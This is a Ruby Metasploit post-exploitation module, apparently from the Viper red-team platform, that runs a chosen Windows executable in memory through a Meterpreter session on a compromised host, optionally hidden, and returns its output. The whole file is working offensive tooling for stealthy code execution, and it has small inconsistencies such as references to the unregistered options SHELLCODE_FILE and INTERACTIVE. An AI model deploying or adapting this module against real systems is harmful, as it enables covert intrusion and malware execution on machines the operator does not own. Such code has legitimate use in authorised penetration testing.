##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require "timeout"
require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Windows Manage Memory pe execute Module',
                      'Description'  => %q{
        This module will inject into the memory of a process a specified pe.
      },
                      'License'      => MSF_LICENSE,
                      'Author'       => ['viper'],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
            [
                    OptPath.new('PE', [true, 'Path to the pe to execute']),
                    OptString.new('ARGUMENTS', [false, 'The arguments to pass to the command']),
                    OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', true]),
                    OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),
                    OptInt.new('WAIT_OUTPUT', [true, 'Seconds to wait for process output', 3]),
            ])
  end

  # Run Method for when run command is issued
  def run
    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    if File.file?(File.join(Msf::Config.loot_directory, datastore['PE']))
      pe = File.join(Msf::Config.loot_directory, datastore['PE'])
    elsif File.file?(datastore['PE'])
      pe = datastore['PE']
    else
      pub_json_result(false,
                      "#{datastore['SHELLCODE_FILE']} not found",
                      nil,
                      self.uuid)
      return
    end
    cmd_args    = datastore['ARGUMENTS']
    hidden      = datastore['HIDDEN']
    channelized = datastore['CHANNELIZED']
    interactive = datastore['INTERACTIVE']
    p           = client.sys.process.execute(pe, cmd_args,
                                             'Channelized'    => channelized,
                                             'Desktop'        => false,
                                             'Session'        => nil,
                                             'Hidden'         => hidden,
                                             'InMemory'       => 'cmd',
                                             'UseThreadToken' => false)

    print_status_redis("Process #{p.pid} created.")
    print_status_redis("Channel #{p.channel.cid} created.") if (p.channel)


    if (channelized and p.channel)
      output = ""
      begin
        Timeout.timeout(datastore['WAIT_OUTPUT']) do
          while (tmp = p.channel.read)
            output = output +tmp
          end
        end
      rescue Timeout::Error
        print_warning_redis("get output timed out")
      end
      pub_json_result(true,
                      nil,
                      {:pid => p.pid, :output => output},
                      self.uuid)
    else
      pub_json_result(true,
                      "execute finish",
                      nil,
                      self.uuid)
      return
    end
  end
end
